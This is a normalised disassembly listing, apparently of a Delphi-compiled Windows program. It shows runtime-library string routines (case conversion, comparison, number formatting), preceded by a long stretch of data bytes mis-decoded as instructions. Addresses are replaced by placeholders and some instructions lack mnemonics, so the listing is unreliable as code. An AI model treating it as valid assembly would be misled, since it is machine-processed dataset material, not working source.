xor al [ eax ]
cwde
xor al [ eax ]
or al [ ebp + 0x4d ]
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x10004075 ]
imul ebp [ edi + 0x6e ] 0x40754890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 2 ] cl
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax + 0x76 ] ah
inc eax
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0xa004032 ] bl
inc ebp
push ebp
outsb
jb r-xdata
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x9004032 ] bl
inc ebp
dec edi
add [ eax ] al
inc esp
imul esi [ esi + 0x69 ] 0x77b46564
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 2 + 0x100040 ] dh
add [ eax ] al
pushad
jbe r-xdata
add [ eax ] dl
add [ eax ] al
add [ eax + 0x76 ] ah
inc eax
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 2 + 0x40 ] bl
outsd
jb r-xdata
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax + 0x76 ] ah
inc eax
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0xa004032 ] bl
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x77
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar [ eax + 0x40 ] 0x0
or al 0x0
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
jb r-xdata
dec ecx
outsb
je r-xdata
pop esp
xor al [ eax ]
cwde
xor al [ eax ]
or al 0x45
add al 0x77
inc eax
add [ eax ] al
add [ eax + 0x32 ] al
inc eax
inc eax
add [ esi + esi * 2 + 0x40 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
insb
imul esp [ ebx + eax * 2 + 0x61 ] 0x408d7473
add [ ecx + edi * 2 ] bl
jbe r-xdata
inc eax
xor al [ eax ]
pop esp
xor al [ eax ]
cwde
xor al [ eax ]
or [ ebp + 0x4f ] eax
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
js r-xdata
add [ eax ] dl
add [ eax ] al
add [ ebx + esi * 2 ] dh
inc eax
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
outsd
ja r-xdata
add [ eax ] al
jb r-xdata
outsb
lea eax [ eax ]
fdivr [ ecx + 0x40 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ ebx + edi * 4 + 0x40 ] bl
add [ eax + 0xf004032 ] bl
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 2 ] bl
inc eax
add [ eax + eax ] cl
add [ eax ] al
test al 0x72
inc eax
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0xd004032 ] bl
inc ebp
inc ebx
outsd
outsb
jbe r-xdata
add [ eax ] al
test al 0x72
inc eax
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
add [ eax + eax ] cl
jae r-xdata
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x65746e69
jb r-xdata
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0xb004032 ] bl
inc ebp
pop edx
jb r-xdata
ror [ eax + edi * 2 ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jbe r-xdata
inc eax
sar [ eax + 0x79 ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ esp + esi * 2 + 0x40 ] al
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0xa004032 ] bl
inc ebp
push eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
jns r-xdata
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x79 ] bh
inc eax
add [ eax ] dl
add [ eax ] al
add [ esp + esi * 2 + 0x40 ] al
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x10004032 ] bl
inc ebp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
inc eax
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
sbb al 0x79
add [ eax ] al
add [ eax + edi * 2 + 0x40 ] ah
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
nop
xor [ edx + 0x40 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
jpe r-xdata
push esi
imul ebp [ edi + 0x6c ] 0x6f697461
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi * 2 + 0x100040 ] cl
add [ eax ] al
inc esp
je r-xdata
add [ eax ] dl
add [ eax ] al
add [ esp + esi * 2 + 0x40 ] al
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0xe004032 ] bl
inc ebp
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdivr [ ecx + 0x40 ]
outsd
add [ edx + esi + 0x40 ] bl
add [ eax + 0xc004032 ] bl
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
jpe r-xdata
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
mov eax eax
in al 0x7a
inc eax
add [ eax ] al
add [ eax ] al
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
test al 0x72
inc eax
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0xd004032 ] bl
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7b ] al
inc eax
add [ eax + eax ] cl
add [ eax ] al
test al 0x72
inc eax
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
outsd
insb
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax + 0x407b ] ah
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x7a
inc eax
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
test al 0x72
inc eax
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00407b ] ah
imul ebp [ edi + 0x6e ] 0x6c696146
lea eax [ eax ]
mov al [ 0x407b ]
outsd
jb r-xdata
arpl [ ebp + eax * 2 + 0x72 ] si
jb r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x10004032 ] bl
inc ebp
inc ecx
jb r-xdata
jb r-xdata
pop esp
xor al [ eax ]
cwde
xor al [ eax ]
or al [ ebp + 0x50 ]
xchg esp eax
adc [ eax ] al
dec eax
add [ eax ] al
add [ eax + edx + 0x53080040 ] dl
jns r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
popad
jae r-xdata
inc ebp
inc ecx
bound esi [ ebx + 0x74 ]
jb r-xdata
cwde
xor al [ eax ]
push cs
pop eax
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7c ] bl
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax - 0xfffbf8e ] ch
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
jb r-xdata
add [ eax ] al
add [ eax - 0xfffbf8e ] ch
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0xe004032 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0xc00407b ]
outsd
jb r-xdata
clc
push ebp
add [ eax + 0x32 ] al
inc eax
xor al 0x40
add ah bh
xor al 0x40
inc eax
add [ eax + 0x407c ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x7c
inc eax
add [ eax + eax ] cl
add [ eax ] al
test al 0x72
inc eax
add al dh
inc ebp
jb r-xdata
add [ edx + esi + 0x40 ] bl
add [ eax + 0x8004032 ] bl
inc ebp
dec edi
push ebx
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
jae r-xdata
adc [ ebp + 0x41 ] al
cld
jpo r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x9004032 ] bl
inc ebp
inc ebx
outsd
outsb
je r-xdata
inc eax
rol [ eax + 0x7b ] 0x40
add [ eax ] al
add [ eax ] al
add [ ecx + 0x100407d ] dl
add [ eax ] al
add [ edx - 0x74 ] dl
adc [ ebx - 0x71 ] bh
sbb eax 0xdf9c4cdb
push edi
popad
dec esp
outsd
arpl [ ecx + 0x6c ] sp
xor al 0x40
add [ eax + 0x32 ] al
inc eax
xor eax 0x35040040
inc eax
add al bh
insb
jae r-xdata
aam 0xe9
fwait
push esi
add [ eax ] al
add eax 0xffffffd4
jmp sub_40d488
add [ eax + eax ] al
add [ eax - 0xfffbff0 ] dh
add [ eax ] al
add [ eax ] al
jge r-xdata
imul ebp [ edi + 0x6e ] 0x407cc890
add [ ecx ] dl
add ebp [ esi ]
aaa
xor al 0x4
add [ eax ] al
add [ eax + edx + r-xdata ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00407c ] dh
add [ eax ] al
add [ eax - 0xfffbf8e ] ch
add [ edx + esi + 0x40 ] bl
add [ eax + 0xe004032 ] bl
inc ebp
dec ecx
outsb
je r-xdata
jpo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x407db83f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
jle r-xdata
loopne r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shr ah 0x7c
inc eax
add [ ecx ] dl
add ebp [ esi ]
cmp [ esp + eax ] dh
add [ eax ] al
add [ eax + edx + r-xdata ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
add [ ebp + edi * 2 + 0x40 ] ah
je r-xdata
adc [ ecx + 0x49313415 ] cl
add [ ebx + 0x49412815 ] cl
add [ ebx + 0xa890448 ] cl
outsb
imul edi [ edx + 0x65 ] r-xdata
add [ edx + esi + 0x40 ] bl
add ah dl
jge r-xdata
jb r-xdata
add [ edx + esi + 0x40 ] bl
add [ eax ] al
rol [ eax ] 0x1
adc edx [ esp + edx * 2 + 0x68 ]
jb r-xdata
je r-xdata
je r-xdata
add [ edx + edx * 8 + 0x54240040 ] ah
dec ebp
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7e ] al
inc eax
add [ eax ] dh
add [ eax ] al
add [ ecx + edx + 0x34f00040 ] ah
inc eax
add [ ecx + ebx * 2 + 0x59c00040 ] dh
inc eax
add [ esi + 0x34f80040 ] al
inc eax
add al dl
pop ecx
inc eax
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
add eax 0xffffffd4
jmp sub_40d41c
inc ebx
outsd
jne r-xdata
insb
jae r-xdata
test al 0xff
dec [ ebx + 0x33c68bf0 ]
leave
mov edx ebx
call sub_402cbc
mov eax esi
pop esi
pop ebx
push edx
popad
inc ebp
js r-xdata
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x12004032 ] bl
inc ebp
push ebx
popad
arpl [ gs : ecx + 0x6c ] sp
insb
inc ebp
js r-xdata
inc eax
sar bh 0xff
insb
jne r-xdata
retn
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026ec
call ebx
pop ebx
retn
xor al 0x31
dec ecx
add [ ebx + 0x34158910 ] cl
xor [ ecx ] ecx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
arpl [ eax + 0x72 ] bp
outsd
sub_407e68
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_407e84
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac8
call sub_403a74
pop edi
pop esi
pop ebx
retn
sub_407ea8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4026cc
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402cbc
mov eax esi
pop esi
pop ebx
retn
sub_407ec8
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026ec
call ebx
pop ebx
retn
sub_407ef4
push ebx
mov ebx eax
mov eax 0xc
call sub_4026cc
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_407ec8
pop ebx
retn
sub_407f2c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4042f8
mov ebx eax
mov eax edi
mov edx ebx
call sub_404684
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_407f68
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4042f8
mov ebx eax
mov eax edi
mov edx ebx
call sub_404684
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_407fa4
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_407fd4
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_407ff4
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_408048
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_407ff4
test eax eax
jne r-xdata
sub_40806c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4042f8
mov ebx eax
mov eax esi
call sub_4044f8
mov edx eax
mov eax edi
mov ecx ebx
call sub_404128
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharUpperBuffA
sub_4080a0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4042f8
mov ebx eax
mov eax esi
call sub_4044f8
mov edx eax
mov eax edi
mov ecx ebx
call sub_404128
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharLowerBuffA
sub_4080d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4042f8
push eax
mov eax esi
call sub_4044f8
push eax
mov eax ebx
call sub_4042f8
push eax
mov eax ebx
call sub_4044f8
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_40810c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4042f8
push eax
mov eax esi
call sub_4044f8
push eax
mov eax ebx
call sub_4042f8
push eax
mov eax ebx
call sub_4044f8
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_40815c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_40817c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_4042f8
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_404038
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_404558
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4081cc
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_4042f8
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_4042f8
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_408230
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_408246
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_408246
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_408246
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_40827c
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_408230
mov edx esi
pop eax
call sub_404128
add esp 0x10
pop esi
retn
sub_40829c
or cl cl
jne sub_4082d0
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_4082d0
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_4082d0
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_4082d0
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_408368
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_40829c
mov edx esi
pop eax
call sub_404128
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_408390
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_408230
mov edx esi
pop eax
call sub_404128
add esp 0x20
pop esi
retn
xor edx edx
sub_4083b8
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402cdc
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407e84
sub_40840c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402cdc
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_40842c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_404e5c
mov [ esi ] eax
mov [ esi + 0x4 ] edx
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_40844c
mov eax [ rw-data ]
call sub_40508c
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_40508c
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405248
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_40408c
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405248
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_40408c
sub_4084dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
